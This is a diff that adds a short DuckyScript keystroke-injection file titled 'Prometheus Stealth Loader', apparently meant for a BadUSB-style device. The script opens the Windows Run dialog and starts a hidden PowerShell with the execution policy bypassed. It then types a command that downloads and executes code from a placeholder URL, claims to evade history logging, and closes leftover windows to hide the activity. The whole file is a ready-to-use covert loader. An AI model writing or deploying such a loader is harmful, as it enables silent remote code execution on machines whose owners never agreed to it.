@@ -1,0 +1,17 @@
+REM --- Prometheus Stealth Loader ---
+GUI r
+DELAY 400
+
+REM start powershell with win r
+STRING powershell -NoP -W Hidden -Exec Bypass -c " "
+ENTER
+DELAY 800
+
+REM main payload with history logging bypass
+STRING  IEX(iwr 'ENTERURLHERE' -UseBasicParsing)
+ENTER
+
+REM Close runing window if left
+GUI r
+DELAY 200
+ESCAPE
